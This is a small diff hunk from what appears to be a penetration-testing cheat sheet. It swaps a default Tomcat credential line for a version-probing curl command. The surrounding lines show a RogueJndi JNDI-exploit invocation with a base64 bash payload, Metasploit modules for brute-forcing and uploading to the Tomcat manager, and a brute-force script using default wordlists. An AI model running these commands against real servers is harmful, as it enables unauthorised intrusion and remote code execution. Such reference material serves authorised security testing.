@@ -1019,7 +1019,7 @@ $ java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,<base64 payload>} 
 
 ```
 http://<IP address>:<port>/manager/html
-tomcat:s3cret
+$ curl -s http://<domain name>:8080/docs/ | grep Tomcat 
 msf > use auxiliary/scanner/http/tomcat_mgr_login
 msf > use exploit/multi/http/tomcat_mgr_upload
 $ python3 mgr_brute.py -U <URL> -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
